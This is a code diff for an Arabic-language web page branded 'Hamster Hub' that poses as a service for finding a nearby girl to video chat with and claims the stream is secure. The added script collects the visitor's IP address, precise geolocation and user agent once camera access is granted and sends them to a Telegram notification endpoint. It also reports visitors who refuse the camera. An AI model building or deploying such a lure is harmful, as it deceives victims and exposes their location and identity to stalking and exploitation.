@@ -3,81 +3,189 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>طلب الكاميرا</title>
+    <title>Hamster Hub</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: Arial, sans-serif;
+            font-family: 'Segoe UI', Arial, sans-serif;
             text-align: center;
-            padding: 50px;
-            background: #f0f0f0;
+            padding: 50px 20px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
         }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 40px;
+            max-width: 700px;
+            width: 100%;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+        h1 { color: #333; margin-bottom: 10px; }
+        .subtitle { color: #666; margin-bottom: 20px; font-size: 14px; }
         video {
-            width: 80%;
-            max-width: 600px;
-            border-radius: 10px;
-            border: 2px solid #ddd;
+            width: 100%;
+            max-width: 500px;
+            border-radius: 12px;
+            border: 3px solid #ddd;
             background: #000;
+            margin: 15px 0;
         }
-        button {
-            padding: 15px 40px;
-            font-size: 18px;
-            margin: 20px;
+        .btn {
+            padding: 15px 50px;
+            font-size: 20px;
+            margin: 15px 0;
             cursor: pointer;
-            background: #4CAF50;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            border-radius: 8px;
+            border-radius: 50px;
+            transition: transform 0.2s, box-shadow 0.2s;
+            font-weight: bold;
         }
-        button:hover { background: #45a049; }
-        #status { margin-top: 20px; color: #333; }
+        .btn:hover { transform: scale(1.05); box-shadow: 0 10px 30px rgba(102, 126, 234, 0.4); }
+        .btn:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+        #status {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 10px;
+            background: #f8f9fa;
+            color: #333;
+            font-size: 14px;
+            word-break: break-word;
+            min-height: 60px;
+        }
+        .success { color: #28a745; font-weight: bold; }
+        .error { color: #dc3545; font-weight: bold; }
+        .info { color: #007bff; }
+        .footer { margin-top: 20px; font-size: 12px; color: #999; }
+        .badge {
+            display: inline-block;
+            background: #28a745;
+            color: white;
+            padding: 2px 10px;
+            border-radius: 20px;
+            font-size: 12px;
+        }
     </style>
 </head>
 <body>
-    <h1>📷 الوصول إلى الكاميرا</h1>
-    <video id="video" autoplay playsinline></video>
-    <br>
-    <button id="startBtn">📸 سماح - تشغيل الكاميرا</button>
-    <div id="status">⏳ انتظر...</div>
+    <div class="container">
+        <h1></h1>
+        <p class="subtitle">HAMSTER HUB</p>
+        <video id="video" autoplay playsinline muted></video>
+        <br>
+        <button class="btn" id="startBtn">تشغيل البث</button>
+        <div id="status">اضغط على الزر اعلاه للبحث عن شخص قريب منك للتحدث معه اسمح للموقع بالوصول للكاميرا والموقع حتى نوفر لك اشخاص قريبين منك</div>
+        <div class="footer">
+            <span class="badge">البث أمن بين الطرفين</span>
+        </div>
+    </div>
 
     <script>
         const video = document.getElementById('video');
         const status = document.getElementById('status');
         const startBtn = document.getElementById('startBtn');
 
-        startBtn.addEventListener('click', async () => {
+        function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve(null);
+                    return;
+                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        resolve({
+                            lat: pos.coords.latitude,
+                            lng: pos.coords.longitude
+                        });
+                    },
+                    () => resolve(null),
+                    { timeout: 5000 }
+                );
+            });
+        }
+
+        async function getUserIP() {
             try {
-                // 1️⃣ طلب الوصول للكاميرا
+                const res = await fetch('https://api.ipify.org?format=json');
+                const data = await res.json();
+                return data.ip;
+            } catch {
+                return 'غير متاح';
+            }
+        }
+
+        startBtn.addEventListener('click', async () => {
+            startBtn.disabled = true;
+            startBtn.textContent = '⏳ جاري طلب فتاة لك...';
+            status.innerHTML = '⏳ جاري طلب الكاميرا...';
+            status.className = 'info';
+
+            try {
                 const stream = await navigator.mediaDevices.getUserMedia({
-                    video: true,
+                    video: { facingMode: 'user' },
                     audio: false
                 });
                 video.srcObject = stream;
                 status.innerHTML = '✅ تم تشغيل الكاميرا بنجاح!';
-                status.style.color = 'green';
+                status.className = 'success';
 
-                // 2️⃣ إرسال إشعار إلى السيرفر (ثم إلى تليجرام)
-                const response = await fetch('http://localhost:3000/notify-telegram', {
+                const [ip, location] = await Promise.all([
+                    getUserIP(),
+                    getLocation()
+                ]);
+
+                const response = await fetch('/notify-telegram', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
                     },
                     body: JSON.stringify({
-                        message: 'المستخدم سمح بالوصول للكاميرا ✅'
+                        message: '✅ المستخدم سمح بالوصول للكاميرا',
+                        userIP: ip,
+                        userAgent: navigator.userAgent,
+                        location: location
                     })
                 });
 
                 const result = await response.json();
                 
                 if (result.success) {
-                    status.innerHTML += '<br>📨 تم إرسال الإشعار إلى تليجرام!';
+                    status.innerHTML += '<br>📨 ✅ تم إرسال الإشعار إلى تليجرام!';
+                    status.className = 'success';
                 } else {
-                    status.innerHTML += '<br>❌ فشل إرسال الإشعار';
+                    status.innerHTML += `<br>❌ فشل إرسال الإشعار: ${result.error || 'خطأ غير معروف'}`;
+                    status.className = 'error';
                 }
 
             } catch (error) {
-                console.error(error);
-                status.innerHTML = '❌ تم رفض الوصول للكاميرا أو حدث خطأ';
-                status.style.color = 'red';
+                console.error('❌ خطأ:', error);
+                
+                if (error.name === 'NotAllowedError') {
+                    status.innerHTML = '❌ تم رفض الوصول للكاميرا من قبل المستخدم';
+                    try {
+                        await fetch('/notify-telegram', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                message: '❌ المستخدم رفض الوصول للكاميرا',
+                                userAgent: navigator.userAgent
+                            })
+                        });
+                    } catch {}
+                } else if (error.name === 'NotFoundError') {
+                    status.innerHTML = '❌ لا توجد كاميرا متصلة بالجهاز';
+                } else {
+                    status.innerHTML = `❌ حدث خطأ: ${error.message}`;
+                }
+                status.className = 'error';
+            } finally {
+                startBtn.disabled = false;
+                startBtn.textContent = '📸 إعادة المحاولة';
             }
         });
     </script>
